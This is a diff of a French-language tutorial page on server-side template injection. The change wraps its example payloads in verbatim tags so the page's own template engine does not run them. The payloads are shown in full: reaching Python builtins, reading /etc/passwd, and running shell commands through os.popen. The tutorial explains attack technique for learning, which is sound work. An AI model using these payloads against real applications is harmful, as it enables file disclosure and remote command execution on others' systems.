@@ -733,7 +733,7 @@ Hello Pedant!</code></pre>
     On peut également accéder aux fonctions Python internes via l’objet <code>__builtins__</code> :
   </p>
 
-  <pre><code>{{ self.__init__.__globals__.__builtins__ }}</code></pre>
+<pre><code>{% verbatim %}{{ self.__init__.__globals__.__builtins__ }}{% endverbatim %}</code></pre>
 
   <p>
     Cela permet d’explorer les fonctions disponibles et de préparer des attaques plus avancées.
@@ -748,8 +748,7 @@ Hello Pedant!</code></pre>
 
   <p><strong>Exemple : lecture de <code>/etc/passwd</code></strong></p>
 
-  <pre><code>{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}</code></pre>
-
+<pre><code>{% verbatim %}{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}{% endverbatim %}</code></pre>
   <p>
     Ce payload lit et affiche le contenu du fichier, permettant d’obtenir des informations sensibles
     sur le système.
@@ -767,7 +766,7 @@ Hello Pedant!</code></pre>
     Le payload général pour importer une bibliothèque et exécuter une commande suit ce schéma :
   </p>
 
-  <pre><code>{{ self.__init__.__globals__.__builtins__.__import__("os").popen("COMMAND").read() }}</code></pre>
+<pre><code>{% verbatim %}{{ self.__init__.__globals__.__builtins__.__import__("os").popen("COMMAND").read() }}{% endverbatim %}</code></pre>
 
   <p>
     En remplaçant <code>COMMAND</code> par une commande système, l’application exécutera cette commande
